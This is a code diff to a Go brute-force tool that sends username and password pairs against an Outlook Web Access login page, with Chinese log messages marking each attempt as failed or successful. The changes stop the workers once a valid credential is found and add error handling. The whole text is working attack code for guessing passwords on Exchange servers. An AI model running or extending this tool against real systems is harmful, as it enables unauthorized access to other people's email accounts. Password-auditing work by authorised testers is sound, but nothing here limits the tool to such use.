@@ -18,6 +18,9 @@ func HttpBruteWorker(info *TaskInfo) {
 	referer, _ := url.JoinPath(info.targetUrl, "/owa/auth/logon.aspx?replaceCurrent=1&url="+refUrl)
 
 	for data := range info.task {
+		if info.done.GetDone() {
+			break
+		}
 		username, password := data[0], data[1]
 		Log.Debug("[*] 尝试: %v:%v", username, password)
 		form := url.Values{
@@ -36,13 +39,17 @@ func HttpBruteWorker(info *TaskInfo) {
 		req.Header.Set("Cookie", "PrivateComputer=true; PBack=0")
 		req.Header.Set("Connection", "close")
 
-		res, _ := Client.Do(req)
+		res, err := Client.Do(req)
+		if err != nil {
+			panic(err)
+		}
 		location := res.Header.Get("Location")
 
 		if location == "" {
 			Log.Failed("[-] 失败: %v", username+":"+password)
 		} else if !strings.Contains(location, "reason") {
 			Log.Success("[+] 成功: %v", username+":"+password)
+			info.done.SetDone()
 		} else {
 			Log.Failed("[-] 失败: %v", username+":"+password)
 		}
